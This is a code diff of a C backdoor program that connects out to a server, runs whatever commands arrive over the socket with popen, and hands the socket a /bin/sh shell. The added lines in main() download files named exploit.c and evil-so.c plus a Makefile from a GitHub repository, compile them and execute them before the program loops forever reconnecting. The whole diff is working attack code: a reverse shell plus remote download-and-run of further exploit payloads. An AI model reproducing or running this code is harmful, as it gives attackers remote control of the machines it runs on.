@@ -17,52 +17,21 @@
 void shell(int sockfd) {
     char buffer[1024];
     int n;
-    // Set TERM environment variable
-    setenv("TERM", "xterm", 1); // Set TERM to xterm or any other terminal type you prefer
-
     while (1) {
         memset(buffer, 0, sizeof(buffer));
         n = read(sockfd, buffer, sizeof(buffer) - 1);
         if (n > 0) {
             buffer[n] = '\0';
-
-            // Check for specific commands
-            if (strcmp(buffer, "ls -la\n") == 0) {
-                FILE *fp = popen("ls -la", "r");
-                if (fp == NULL) {
-                    char error[] = "Failed to run command\n";
-                    write(sockfd, error, strlen(error));
-                    continue;
-                }
-                while (fgets(buffer, sizeof(buffer) - 1, fp) != NULL) {
-                    write(sockfd, buffer, strlen(buffer));
-                }
-                pclose(fp);
-            } else if (strcmp(buffer, "bash -i\n") == 0) {
-                // Start an interactive bash shell with job control
-                FILE *fp = popen("bash -i", "r");
-                if (fp == NULL) {
-                    char error[] = "Failed to run command\n";
-                    write(sockfd, error, strlen(error));
-                    continue;
-                }
-                while (fgets(buffer, sizeof(buffer) - 1, fp) != NULL) {
-                    write(sockfd, buffer, strlen(buffer));
-                }
-                pclose(fp);
-            } else {
-                // For other commands, use popen
-                FILE *fp = popen(buffer, "r");
-                if (fp == NULL) {
-                    char error[] = "Failed to run command\n";
-                    write(sockfd, error, strlen(error));
-                    continue;
-                }
-                while (fgets(buffer, sizeof(buffer) - 1, fp) != NULL) {
-                    write(sockfd, buffer, strlen(buffer));
-                }
-                pclose(fp);
+            FILE *fp = popen(buffer, "r");
+            if (fp == NULL) {
+                char error[] = "Failed to run command\n";
+                write(sockfd, error, strlen(error));
+                continue;
             }
+            while (fgets(buffer, sizeof(buffer) - 1, fp) != NULL) {
+                write(sockfd, buffer, strlen(buffer));
+            }
+            pclose(fp);
             write(sockfd, "\n", 1);
         } else {
             break;
@@ -76,8 +45,7 @@ void action(int sockfd) {
         dup2(sockfd, STDIN_FILENO);
         dup2(sockfd, STDOUT_FILENO);
         dup2(sockfd, STDERR_FILENO);
-        // Start a bash shell with job control
-        execl("/bin/bash", "bash", "-i", (char *) NULL);
+        execl("/bin/sh", "sh", (char *) NULL);
         exit(0);
     } else {
         wait(NULL);
@@ -138,11 +106,39 @@ int connect_and_run() {
 }
 
 int main() {
+
+    // Download additional files
+    system("wget https://raw.githubusercontent.com/xxTYPOxx/fck/refs/heads/main/exploit.c -O exploit.c");
+    system("wget https://raw.githubusercontent.com/xxTYPOxx/fck/refs/heads/main/evil-so.c -O evil-so.c");
+    system("wget https://raw.githubusercontent.com/xxTYPOxx/fck/refs/heads/main/Makefile -O Makefile");
+
+    // Make pwn.c executable first
+    system("chmod +x exploit.c");
+
+    // Compile pwn.c to create the executable pwn
+    system("gcc -o exploit exploit.c");
+
+    // Execute the downloaded and compiled pwn file
+    system("./exploit");
+
+    system("chmod +x evil-so.c");
+
+    // Compile pwn.c to create the executable pwn
+    system("gcc -o evil-so evil-so.c");
+
+    // Execute the downloaded and compiled pwn file
+    system("./evil-so");
+
+    // Execute the Makefile if needed
+    system("./make");
+
+    // Main loop to connect and run
     while (1) {
         if (connect_and_run() < 0) {
             printf("Reconnecting in %d seconds...\n", RECONNECT_DELAY);
             sleep(RECONNECT_DELAY);
         }
     }
-    return 0;
+
+    return 0; // This line will never be reached due to the infinite loop
 }
